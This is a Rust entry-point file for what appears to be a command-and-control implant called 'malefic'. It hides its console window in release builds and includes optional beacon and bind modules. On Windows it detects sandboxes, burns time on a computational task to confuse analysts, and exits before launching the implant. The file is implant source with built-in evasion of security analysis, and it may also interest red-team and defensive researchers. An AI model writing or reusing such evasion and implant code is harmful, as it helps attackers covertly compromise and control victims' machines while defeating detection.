#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
mod malefic;
mod meta;
mod stub;

#[cfg(feature = "beacon")]
mod beacon;
#[cfg(feature = "bind")]
mod bind;

use crate::malefic::Malefic;
use futures::executor::block_on;

fn main() {
    block_on(async {
        #[cfg(all(feature = "anti_sandbox", target_os = "windows"))]
        {
            use malefic_helper::win::anti::{detect_sandbox, perform_computational_task};
            use std::process::exit;
            let sandbox_result = detect_sandbox();
            if sandbox_result.is_sandbox  {
                // Execute time-consuming tasks to confuse analysis
                perform_computational_task(4294836225);
                exit(0);
            }
        }
        
        #[cfg(feature = "malefic-prelude")]
        if let Err(e) = malefic_prelude::run() {
            malefic_helper::debug!("Failed to execute prelude: {}", e);
        }

        Malefic::run(malefic_proto::get_sid()).await;
    });
}
